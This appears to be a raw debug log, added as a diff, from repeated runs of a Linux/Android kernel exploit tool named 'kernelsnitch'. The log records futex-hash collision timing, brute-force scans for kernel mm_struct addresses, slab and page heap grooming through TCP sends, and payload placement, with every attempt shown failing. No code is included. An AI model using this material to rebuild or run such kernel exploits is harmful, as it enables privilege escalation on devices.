+[b24e39de8 23:25:56] [33m[*][t13553] [0mreclaim queue right after sends rxq=3670016 txq=0
+[b24e39de8 23:25:56] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:25:56] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:25:56] [33m[*][t13553] [0mpayload nonce want=39791b7a3086945a got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:25:56] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93ca7c9070 len=8 fill=0 pos=7883678008957363548 page=92978c329b062b14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:25:56] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93ca7c9070 len=8 fill=0 pos=7883678008957363548 page=92978c329b062b14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:25:56] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93ca7c9070 len=8 fill=0 pos=7883678008957363548 page=92978c329b062b14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:25:56] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93ca7c9100 len=8 fill=0 pos=7883678008957363548 page=92978c329b062ba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:25:56] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93ca7c9100 len=8 fill=0 pos=7883678008957363548 page=92978c329b062ba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:25:56] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93ca7c9100 len=8 fill=0 pos=7883678008957363548 page=92978c329b062ba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:25:56] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:25:56] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:25:56] [33m[*][t13553] [0mpayload gate pass=0 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=0 (sends=896 shorts=0 floor=512 hit=0 nhit2=0) hit_idx=-1 k_hit=-1 k_true=1 ord3=0/0 all=0/0 drain_pages=8192
+[b24e39de8 23:25:56] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:25:56] [31m[-][t13553] [0mpayload did not land, discard base=0xffffff93ca7c8000 freed=0 open_ok=0 nonce_hit=0 wp=-1/-1/-1
+[b24e39de8 23:25:56] [31m[-][t13553] [0mprepare_kernel_page retry 8/72
+[b24e39de8 23:25:56] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:25:58] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:25:58] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff91c0000000-ffffff9540000000] mte disabled
+[b24e39de8 23:25:58] [33m[*][t31872] [0mapprox_time=6 thr=60
+[b24e39de8 23:25:59] [33m[*][t31872] [0mstart finding collisisons
+[b24e39de8 23:25:59] [33m[*][t31872] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:25:59] [33m[*][t31872] [0mtarget_time=137 thr=60
+[b24e39de8 23:26:01] [33m[*][t31872] [0m  0000006988478f60 i=4076 t=14187/17765/17557
+[b24e39de8 23:26:02] [33m[*][t31872] [0m  0000006988519468 i=4237 t=14295/14464/17744
+[b24e39de8 23:26:03] [33m[*][t31872] [0m  0000006988cc21b0 i=6198 t=17791/17784/14426
+[b24e39de8 23:26:05] [33m[*][t31872] [0m  00000069899a78d8 i=9499 t=17589/17745/17747
+[b24e39de8 23:26:05] [33m[*][t31872] [0m  0000006989b17458 i=9867 t=17788/17607/17785
+[b24e39de8 23:26:05] [33m[*][t31872] [0mfound 5 collisisons
+[b24e39de8 23:26:06] [33m[*][t31872] [0mpost-pile baseline=20 target=27 count=5
+[b24e39de8 23:26:06] [33m[*][t31872] [0mpost-pile[1] 0000006988478f60 t=27
+[b24e39de8 23:26:06] [33m[*][t31872] [0mpost-pile[2] 0000006988519468 t=14
+[b24e39de8 23:26:06] [33m[*][t31872] [0mpost-pile[3] 0000006988cc21b0 t=14
+[b24e39de8 23:26:06] [33m[*][t31872] [0mpost-pile[4] 00000069899a78d8 t=13
+[b24e39de8 23:26:06] [33m[*][t31872] [0mpost-pile[5] 0000006989b17458 t=14
+[b24e39de8 23:26:06] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:26:06] [33m[*][t7056] [0m[  2] start finding mm_struct [ffffff9280000000-ffffff9340000000]
+[b24e39de8 23:26:06] [33m[*][t7055] [0m[  1] start finding mm_struct [ffffff9200000000-ffffff92c0000000]
+[b24e39de8 23:26:06] [33m[*][t7063] [0m[  5] start finding mm_struct [ffffff93c0000000-ffffff9480000000]
+[b24e39de8 23:26:06] [33m[*][t7061] [0m[  4] start finding mm_struct [ffffff9380000000-ffffff9400000000]
+[b24e39de8 23:26:06] [33m[*][t7065] [0m[  7] start finding mm_struct [ffffff94c0000000-ffffff9540000000]
+[b24e39de8 23:26:06] [33m[*][t7064] [0m[  6] start finding mm_struct [ffffff9440000000-ffffff9500000000]
+[b24e39de8 23:26:06] [33m[*][t7057] [0m[  3] start finding mm_struct [ffffff9300000000-ffffff9380000000]
+[b24e39de8 23:26:06] [33m[*][t7047] [0m[  0] start finding mm_struct [ffffff91c0000000-ffffff9240000000]
+[b24e39de8 23:26:06] [33m[*][t7063] [0mfound mm_struct ffffff941ea53fc0
+[b24e39de8 23:26:06] [33m[*][t7065] [0m[  7] scan done coarse=ffffff9540000000 end=ffffff9540000000 found=1
+[b24e39de8 23:26:06] [33m[*][t7055] [0m[  1] scan done coarse=ffffff9280000000 end=ffffff92c0000000 found=1
+[b24e39de8 23:26:06] [33m[*][t7061] [0m[  4] scan done coarse=ffffff9400000000 end=ffffff9400000000 found=1
+[b24e39de8 23:26:06] [33m[*][t7057] [0m[  3] scan done coarse=ffffff9380000000 end=ffffff9380000000 found=1
+[b24e39de8 23:26:06] [33m[*][t7047] [0m[  0] scan done coarse=ffffff9240000000 end=ffffff9240000000 found=1
+[b24e39de8 23:26:06] [33m[*][t7063] [0m[  5] scan done coarse=ffffff9440000000 end=ffffff9480000000 found=1
+[b24e39de8 23:26:06] [33m[*][t7064] [0m[  6] scan done coarse=ffffff94c0000000 end=ffffff9500000000 found=1
+[b24e39de8 23:26:06] [33m[*][t7056] [0m[  2] scan done coarse=ffffff9300000000 end=ffffff9340000000 found=1
+[b24e39de8 23:26:06] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff941ea50000 phys_probe=0xffffff91e2bd1d38 delta=9594987208 (8.9GB)
+[b24e39de8 23:26:06] [33m[*][t13553] [0mprepare_skb_payload base=ffffff941ea50000 delta=0 payload_base=ffffff941ea50000
+[b24e39de8 23:26:06] [33m[*][t13553] [0mskbdelta wrote pb=ffffff941ea50000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:26:06] [33m[*][t13553] [0mpayload nonce 256c239930869454 at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:26:06] [33m[*][t13553] [0mdone
+[b24e39de8 23:26:06] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:26:06] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:26:06] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:06] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:06] [33m[*][t13553] [0mfix40 free-arm n=7 est_pfn=3009104 k=[-2,4]
+[b24e39de8 23:26:06] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:26:07] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:26:07] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:26:07] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:26:07] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:26:07] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:26:08] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:26:08] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:26:08] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:26:08] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:08] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:26:08] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:26:08] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:08] [33m[*][t13553] [0mfix36 tp arm n=7 ctrl=1 est_pfn=3009104 k=[-2,4] k_fixed=-1
+[b24e39de8 23:26:08] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:26:08] [33m[*][t13553] [0mfix36 phase1 tp ctrl=523 ord3=501 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:26:08] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:26:09] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:26:09] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:26:09] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:26:09] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:26:09] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:26:09] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:26:10] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:26:10] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:26:10] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:26:10] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=31 objs=884 free=170
+[b24e39de8 23:26:10] [33m[*][t13553] [0mfix40 free HIT pfn=3271248 k=1 hits=1
+[b24e39de8 23:26:10] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:26:10] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:26:10] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff941ea51100 errno=22
+[b24e39de8 23:26:10] [31m[-][t13553] [0mwatchpoint open open addr=ffffff941ea51070 errno=22
+[b24e39de8 23:26:10] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff941ea57f00 errno=22
+[b24e39de8 23:26:10] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:26:10] [33m[*][t7086] [0mfix36 tp arm n=7 ctrl=1 est_pfn=3009104 k=[-2,4] k_fixed=-1
+[b24e39de8 23:26:10] [33m[*][t7086] [0mphase2 conn[0] sends ok=112
+[b24e39de8 23:26:10] [33m[*][t7086] [0mphase2 conn[1] sends ok=112
+[b24e39de8 23:26:10] [33m[*][t7086] [0mphase2 conn[2] sends ok=112
+[b24e39de8 23:26:10] [33m[*][t7086] [0mphase2 conn[3] sends ok=112
+[b24e39de8 23:26:10] [33m[*][t7086] [0mphase2 conn[4] sends ok=112
+[b24e39de8 23:26:10] [33m[*][t7086] [0mphase2 conn[5] sends ok=112
+[b24e39de8 23:26:10] [33m[*][t7086] [0mphase2 conn[6] sends ok=112
+[b24e39de8 23:26:10] [33m[*][t7086] [0mphase2 conn[7] sends ok=112
+[b24e39de8 23:26:10] [33m[*][t13553] [0mfix38 no capture during sends gsend=896 last_ord3=899
+[b24e39de8 23:26:10] [33m[*][t13553] [0mphase2 total sends ok=896 last_err=0 shorts=0
+[b24e39de8 23:26:10] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:26:10] [33m[*][t13553] [0mfix36 phase2 tp ctrl=904 ord3=899 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:26:10] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff941ea52238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:26:10] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:26:10] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 38[b24e39de8 23:26:10] [33m[*][t13553] [0m 2f[b24e39de8 23:26:10] [33m[*][t13553] [0m de[b24e39de8 23:26:10] [33m[*][t13553] [0m 6a[b24e39de8 23:26:10] [33m[*][t13553] [0m d3[b24e39de8 23:26:10] [33m[*][t13553] [0m ff[b24e39de8 23:26:10] [33m[*][t13553] [0m ff[b24e39de8 23:26:10] [33m[*][t13553] [0m ff[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m 00[b24e39de8 23:26:10] [33m[*][t13553] [0m
+[b24e39de8 23:26:10] [33m[*][t13553] [0mslabinfo after sends: slabs=31 objs=884 free=170
+[b24e39de8 23:26:10] [33m[*][t13553] [0mreclaim queue right after sends rxq=3670016 txq=0
+[b24e39de8 23:26:10] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:26:10] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:26:10] [33m[*][t13553] [0mpayload nonce want=256c239930869454 got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:26:10] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff941ea51070 len=8 fill=0 pos=7883678008957363548 page=92978c32ef2eab14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:26:10] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff941ea51070 len=8 fill=0 pos=7883678008957363548 page=92978c32ef2eab14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:26:10] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff941ea51070 len=8 fill=0 pos=7883678008957363548 page=92978c32ef2eab14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:26:10] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff941ea51100 len=8 fill=0 pos=7883678008957363548 page=92978c32ef2eaba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:26:10] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff941ea51100 len=8 fill=0 pos=7883678008957363548 page=92978c32ef2eaba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:26:10] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff941ea51100 len=8 fill=0 pos=7883678008957363548 page=92978c32ef2eaba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:26:10] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:26:10] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:26:10] [33m[*][t13553] [0mpayload gate pass=0 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=0 (sends=896 shorts=0 floor=512 hit=0 nhit2=0) hit_idx=-1 k_hit=-1 k_true=1 ord3=0/0 all=0/0 drain_pages=8192
+[b24e39de8 23:26:10] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:26:10] [31m[-][t13553] [0mpayload did not land, discard base=0xffffff941ea50000 freed=0 open_ok=0 nonce_hit=0 wp=-1/-1/-1
+[b24e39de8 23:26:10] [31m[-][t13553] [0mprepare_kernel_page retry 9/72
+[b24e39de8 23:26:10] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:26:12] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:26:12] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff91c0000000-ffffff9540000000] mte disabled
+[b24e39de8 23:26:12] [33m[*][t9459] [0mapprox_time=7 thr=70
+[b24e39de8 23:26:13] [33m[*][t9459] [0mstart finding collisisons
+[b24e39de8 23:26:13] [33m[*][t9459] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:26:13] [33m[*][t9459] [0mtarget_time=130 thr=70
+[b24e39de8 23:26:14] [33m[*][t9459] [0m  0000006987b56650 i=1738 t=17632/17616/17722
+[b24e39de8 23:26:15] [33m[*][t9459] [0m  0000006988209be8 i=3453 t=14335/17705/17716
+[b24e39de8 23:26:17] [33m[*][t9459] [0m  0000006988e0ec10 i=6530 t=17654/17775/15219
+[b24e39de8 23:26:18] [33m[*][t9459] [0m  00000069890b8160 i=7212 t=12499/12130/17773
+[b24e39de8 23:26:19] [33m[*][t9459] [0m  0000006989ccb1f8 i=10303 t=17596/17705/17668
+[b24e39de8 23:26:19] [33m[*][t9459] [0mfound 5 collisisons
+[b24e39de8 23:26:20] [33m[*][t9459] [0mpost-pile baseline=21 target=25 count=5
+[b24e39de8 23:26:20] [33m[*][t9459] [0mpost-pile[1] 0000006987b56650 t=25
+[b24e39de8 23:26:20] [33m[*][t9459] [0mpost-pile[2] 0000006988209be8 t=25
+[b24e39de8 23:26:20] [33m[*][t9459] [0mpost-pile[3] 0000006988e0ec10 t=25
+[b24e39de8 23:26:20] [33m[*][t9459] [0mpost-pile[4] 00000069890b8160 t=25
+[b24e39de8 23:26:20] [33m[*][t9459] [0mpost-pile[5] 0000006989ccb1f8 t=13
+[b24e39de8 23:26:20] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:26:20] [33m[*][t14282] [0m[  0] start finding mm_struct [ffffff91c0000000-ffffff9240000000]
+[b24e39de8 23:26:20] [33m[*][t14283] [0m[  1] start finding mm_struct [ffffff9200000000-ffffff92c0000000]
+[b24e39de8 23:26:20] [33m[*][t14285] [0m[  3] start finding mm_struct [ffffff9300000000-ffffff9380000000]
+[b24e39de8 23:26:20] [33m[*][t14284] [0m[  2] start finding mm_struct [ffffff9280000000-ffffff9340000000]
+[b24e39de8 23:26:20] [33m[*][t14286] [0m[  4] start finding mm_struct [ffffff9380000000-ffffff9400000000]
+[b24e39de8 23:26:20] [33m[*][t14287] [0m[  5] start finding mm_struct [ffffff93c0000000-ffffff9480000000]
+[b24e39de8 23:26:20] [33m[*][t14288] [0m[  6] start finding mm_struct [ffffff9440000000-ffffff9500000000]
+[b24e39de8 23:26:20] [33m[*][t14289] [0m[  7] start finding mm_struct [ffffff94c0000000-ffffff9540000000]
+[b24e39de8 23:26:20] [33m[*][t14287] [0mfound mm_struct ffffff93c88230c0
+[b24e39de8 23:26:20] [33m[*][t14286] [0m[  4] scan done coarse=ffffff93c0000000 end=ffffff9400000000 found=1
+[b24e39de8 23:26:20] [33m[*][t14285] [0m[  3] scan done coarse=ffffff9340000000 end=ffffff9380000000 found=1
+[b24e39de8 23:26:20] [33m[*][t14283] [0m[  1] scan done coarse=ffffff9240000000 end=ffffff92c0000000 found=1
+[b24e39de8 23:26:20] [33m[*][t14284] [0m[  2] scan done coarse=ffffff92c0000000 end=ffffff9340000000 found=1
+[b24e39de8 23:26:20] [33m[*][t14282] [0m[  0] scan done coarse=ffffff9200000000 end=ffffff9240000000 found=1
+[b24e39de8 23:26:20] [33m[*][t14287] [0m[  5] scan done coarse=ffffff9400000000 end=ffffff9480000000 found=1
+[b24e39de8 23:26:20] [33m[*][t14289] [0m[  7] scan done coarse=ffffff9500000000 end=ffffff9540000000 found=1
+[b24e39de8 23:26:20] [33m[*][t14288] [0m[  6] scan done coarse=ffffff9480000000 end=ffffff9500000000 found=1
+[b24e39de8 23:26:20] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff93c8820000 phys_probe=0xffffff91e2bd1d38 delta=8149852872 (7.6GB)
+[b24e39de8 23:26:20] [33m[*][t13553] [0mprepare_skb_payload base=ffffff93c8820000 delta=0 payload_base=ffffff93c8820000
+[b24e39de8 23:26:20] [33m[*][t13553] [0mskbdelta wrote pb=ffffff93c8820000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:26:20] [33m[*][t13553] [0mpayload nonce 2197b15e30869446 at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:26:20] [33m[*][t13553] [0mdone
+[b24e39de8 23:26:20] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:26:20] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:26:20] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:20] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:20] [33m[*][t13553] [0mfix40 free-arm n=8 est_pfn=2656288 k=[-2,5]
+[b24e39de8 23:26:20] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:26:21] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:26:21] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:26:21] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:26:21] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:26:21] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:26:21] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:26:22] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:26:22] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:26:22] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:22] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:26:22] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:26:22] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:22] [33m[*][t13553] [0mfix36 tp arm n=8 ctrl=1 est_pfn=2656288 k=[-2,5] k_fixed=-1
+[b24e39de8 23:26:22] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:26:22] [33m[*][t13553] [0mfix36 phase1 tp ctrl=525 ord3=501 best=0 best_pfn=0 best3=0 best3_pfn=0 n=8
+[b24e39de8 23:26:22] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:26:22] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:26:22] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:26:23] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:26:23] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:26:23] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:26:23] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:26:23] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:26:24] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:26:24] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:26:24] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=31 objs=884 free=170
+[b24e39de8 23:26:24] [33m[*][t13553] [0mfix40 free HIT pfn=2918432 k=1 hits=1
+[b24e39de8 23:26:24] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:26:24] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:26:24] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff93c8821100 errno=22
+[b24e39de8 23:26:24] [31m[-][t13553] [0mwatchpoint open open addr=ffffff93c8821070 errno=22
+[b24e39de8 23:26:24] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff93c8827f00 errno=22
+[b24e39de8 23:26:24] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:26:24] [33m[*][t14301] [0mfix36 tp arm n=8 ctrl=1 est_pfn=2656288 k=[-2,5] k_fixed=-1
+[b24e39de8 23:26:24] [33m[*][t14301] [0mphase2 conn[0] sends ok=112
+[b24e39de8 23:26:24] [33m[*][t14301] [0mphase2 conn[1] sends ok=112
+[b24e39de8 23:26:24] [33m[*][t14301] [0mphase2 conn[2] sends ok=112
+[b24e39de8 23:26:24] [33m[*][t14301] [0mphase2 conn[3] sends ok=112
+[b24e39de8 23:26:24] [33m[*][t14301] [0mphase2 conn[4] sends ok=112
+[b24e39de8 23:26:24] [33m[*][t14301] [0mphase2 conn[5] sends ok=112
+[b24e39de8 23:26:24] [33m[*][t14301] [0mphase2 conn[6] sends ok=112
+[b24e39de8 23:26:24] [33m[*][t14301] [0mphase2 conn[7] sends ok=112
+[b24e39de8 23:26:24] [33m[*][t13553] [0mfix38 no capture during sends gsend=896 last_ord3=898
+[b24e39de8 23:26:24] [33m[*][t13553] [0mphase2 total sends ok=896 last_err=0 shorts=0
+[b24e39de8 23:26:24] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:26:24] [33m[*][t13553] [0mfix36 phase2 tp ctrl=903 ord3=898 best=0 best_pfn=0 best3=0 best3_pfn=0 n=8
+[b24e39de8 23:26:24] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff93c8822238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:26:24] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:26:24] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 38[b24e39de8 23:26:24] [33m[*][t13553] [0m 2f[b24e39de8 23:26:24] [33m[*][t13553] [0m de[b24e39de8 23:26:24] [33m[*][t13553] [0m 6a[b24e39de8 23:26:24] [33m[*][t13553] [0m d3[b24e39de8 23:26:24] [33m[*][t13553] [0m ff[b24e39de8 23:26:24] [33m[*][t13553] [0m ff[b24e39de8 23:26:24] [33m[*][t13553] [0m ff[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m 00[b24e39de8 23:26:24] [33m[*][t13553] [0m
